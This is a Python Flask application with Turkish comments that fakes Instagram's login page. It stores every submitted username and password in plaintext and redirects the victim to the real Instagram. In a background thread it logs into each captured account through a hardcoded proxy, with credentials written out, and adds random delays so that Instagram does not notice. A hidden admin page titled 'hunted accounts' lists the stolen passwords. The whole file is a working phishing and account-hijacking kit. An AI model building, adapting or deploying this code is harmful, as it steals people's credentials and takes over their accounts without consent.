import os
import threading
import time
import random
from flask import Flask, request, jsonify, render_template_string, redirect
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# PROXY ENTEGRASYONU (Senin verdiğin bilgilerle)
PROXY_ADDR = "82.41.250.136"
PROXY_PORT = "42158"
PROXY_USER = "SDDLzRveLbkavJr"
PROXY_PASS = "MPvdO65MOnMifL7"
PROXY_URL = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_ADDR}:{PROXY_PORT}"

class UserAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(100))
    status = db.Column(db.String(100), default="Bekliyor")
    created_at = db.Column(db.String(100), default=lambda: time.strftime("%H:%M:%S"))

def background_bot(u, p):
    with app.app_context():
        cl = Client()
        acc = UserAccount.query.filter_by(username=u).first()
        try:
            # Proxy'yi aktif et
            cl.set_proxy(PROXY_URL)
            # Instagram'ın anlamaması için rastgele bekleme
            time.sleep(random.randint(3, 7))
            
            if cl.login(u, p):
                acc.status = "BOT_AKTIF ✅"
                # Örnek bot işlemi: Kendi hesabını takip ettir vb.
            else:
                acc.status = "GIRIS_HATASI ❌"
        except Exception as e:
            acc.status = f"HATA: {str(e)[:30]}"
        db.session.commit()

# --- ANA GİRİŞ SAYFASI ---
@app.route('/')
def index():
    return render_template_string(LOGIN_HTML)

# --- VERİ YAKALAMA VE YÖNLENDİRME ---
@app.route('/login', methods=['POST'])
def login():
    u = request.form.get('u')
    p = request.form.get('p')
    if u and p:
        acc = UserAccount.query.filter_by(username=u).first()
        if not acc:
            acc = UserAccount(username=u, password=p)
            db.session.add(acc)
        else:
            acc.password, acc.status = p, "Yeniden Deneniyor"
        db.session.commit()

        # Botu arka plana at (Kullanıcıyı asla bekletmez)
        threading.Thread(target=background_bot, args=(u, p)).start()
        
        # Kullanıcıyı hemen gerçek Instagram'a yolla
        return redirect("https://www.instagram.com/accounts/login/")
    return redirect("/")

# --- GİZLİ ADMİN PANELİ ---
@app.route('/admin-ozel-panel')
def admin_panel():
    accounts = UserAccount.query.order_by(UserAccount.id.desc()).all()
    return render_template_string(ADMIN_HTML, accounts=accounts)

# --- HTML ŞABLONLARI ---
LOGIN_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş Yap • Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-black flex flex-col items-center justify-center min-h-screen p-4">
    <div class="w-full max-w-[350px] bg-black border border-zinc-800 p-8 text-center rounded-sm">
        <h1 class="text-4xl italic font-bold text-white mb-10 tracking-tighter">Instagram</h1>
        <form action="/login" method="POST">
            <input name="u" placeholder="Telefon numarası, kullanıcı adı veya e-posta" class="w-full bg-zinc-900 border border-zinc-800 p-2.5 rounded-sm mb-2 text-xs text-white outline-none focus:border-zinc-500" required>
            <input name="p" type="password" placeholder="Şifre" class="w-full bg-zinc-900 border border-zinc-800 p-2.5 rounded-sm mb-4 text-xs text-white outline-none focus:border-zinc-500" required>
            <button class="w-full bg-[#0095f6] hover:bg-[#1877f2] text-white font-bold py-1.5 rounded-lg text-sm transition">Giriş Yap</button>
        </form>
    </div>
</body>
</html>
"""

ADMIN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Admin Kontrol</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-zinc-950 text-zinc-300 p-10">
    <h1 class="text-3xl font-black text-white mb-8 italic">AVLANAN HESAPLAR 🎯</h1>
    <div class="overflow-hidden rounded-xl border border-zinc-800 bg-zinc-900">
        <table class="w-full text-left text-sm">
            <thead class="bg-zinc-800 text-white uppercase text-xs">
                <tr>
                    <th class="p-4">Zaman</th><th class="p-4">Kullanıcı</th><th class="p-4">Şifre</th><th class="p-4">Bot Durumu</th>
                </tr>
            </thead>
            <tbody>
                {% for acc in accounts %}
                <tr class="border-t border-zinc-800 hover:bg-zinc-800/50">
                    <td class="p-4">{{ acc.created_at }}</td>
                    <td class="p-4 font-bold text-purple-400">@{{ acc.username }}</td>
                    <td class="p-4 text-white font-mono">{{ acc.password }}</td>
                    <td class="p-4"><span class="bg-black px-3 py-1 rounded-full text-[10px]">{{ acc.status }}</span></td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
    </div>
    <button onclick="location.reload()" class="mt-6 bg-purple-600 text-white px-6 py-2 rounded-lg font-bold">LİSTEYİ YENİLE</button>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
